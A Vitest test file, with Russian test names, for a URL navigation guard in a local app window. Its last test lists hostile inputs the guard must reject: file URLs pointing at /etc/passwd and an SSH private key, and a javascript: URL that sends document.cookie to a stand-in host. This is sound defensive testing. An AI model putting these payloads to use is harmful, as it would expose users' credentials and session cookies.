import { describe, expect, it } from "vitest";

import { navigationVerdict } from "../navigation";

const ORIGIN = "http://127.0.0.1:3332";

describe("куда окну позволено уходить", () => {
  it("своё происхождение пускает", () => {
    expect(navigationVerdict(`${ORIGIN}/`, ORIGIN)).toBe("свой");
    expect(navigationVerdict(`${ORIGIN}/assets/index-a1b2.js`, ORIGIN)).toBe("свой");
    expect(navigationVerdict(`${ORIGIN}/obj/${"a".repeat(64)}.glb`, ORIGIN)).toBe("свой");
  });

  it("соседний порт СВОИМ НЕ СЧИТАЕТСЯ, даже если происхождение — его префикс", () => {
    // Ровно та ловушка, ради которой модуль и появился: startsWith здесь врал.
    expect(navigationVerdict("http://127.0.0.1:33321/зло", ORIGIN)).toBe("наружу");
    expect(navigationVerdict("http://127.0.0.1:33320/", ORIGIN)).toBe("наружу");
  });

  it("другой хост на том же порту своим не считается", () => {
    expect(navigationVerdict("http://evil.example:3332/", ORIGIN)).toBe("наружу");
    // 127.0.0.1 и localhost — разные происхождения для браузера, и здесь тоже.
    expect(navigationVerdict("http://localhost:3332/", ORIGIN)).toBe("наружу");
  });

  it("другая схема на том же адресе своим не считается", () => {
    expect(navigationVerdict("https://127.0.0.1:3332/", ORIGIN)).toBe("наружу");
  });

  it("http и https уходят во внешний браузер", () => {
    expect(navigationVerdict("https://docs.example/manual", ORIGIN)).toBe("наружу");
    expect(navigationVerdict("http://example.org/", ORIGIN)).toBe("наружу");
  });

  it("всё прочее запрещено молча", () => {
    // file: открыл бы что угодно с диска, а прочие схемы зовут чужие программы.
    for (const url of [
      "file:///etc/passwd",
      "file:///home/user/.ssh/id_rsa",
      "javascript:fetch('http://x/'+document.cookie)",
      "data:text/html,<script>1</script>",
      "chrome://settings",
      "devtools://devtools/bundled/inspector.html",
      "vscode://file/etc/passwd",
      "не-url-вовсе",
      "",
    ]) {
      expect(navigationVerdict(url, ORIGIN), url).toBe("запрет");
    }
  });
});
